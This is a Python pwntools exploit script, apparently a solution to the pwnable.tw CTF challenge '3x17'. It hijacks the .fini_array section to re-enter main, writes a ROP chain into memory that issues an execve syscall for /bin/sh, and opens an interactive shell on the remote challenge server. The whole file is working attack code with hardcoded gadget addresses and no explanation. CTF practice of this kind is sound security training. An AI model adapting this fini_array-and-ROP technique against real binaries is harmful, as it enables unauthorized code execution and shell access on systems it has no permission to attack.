
#!/usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *


def send_data(addr,data):
    io.recvuntil('addr:')
    io.sendline(str(addr))
    io.recvuntil('data:')
    io.sendline(data)

def exploit():
    fini_array = 0x00000000004B40F0
    main = 0x0000000000401B6D
    loop_func = 0x0000000000402960
    ret = 0x0000000000401C4B

    #change .fini.array[1] = main,.fini.array[0] = loop_func
    send_data(fini_array,p64(loop_func)+p64(main))
    print('change .fini.array')
    #rop
    pop_eax = 0x000000000041e4af
    pop_edi = 0x0000000000401696
    pop_esi = 0x0000000000406c30
    pop_edx = 0x0000000000446e35
    syscall = 0x0000000000471db5
    binsh = 0x00000000004B4080
    start = 0x00000000004B4100
    sys_read = 0x0000000000446E2C

    send_data(start,p64(pop_eax)+p64(0x3b))
    send_data(start+16,p64(pop_edi)+p64(binsh))
    send_data(binsh,"/bin/sh\x00")

    send_data(start+32,p64(pop_esi)+p64(0))
    send_data(start+48,p64(pop_edx)+p64(0))
    send_data(start+64,p64(syscall))
    send_data(fini_array,p64(ret))
    io.interactive()


io = remote('chall.pwnable.tw',10105)
#io = process('./3x17.dms')
exploit()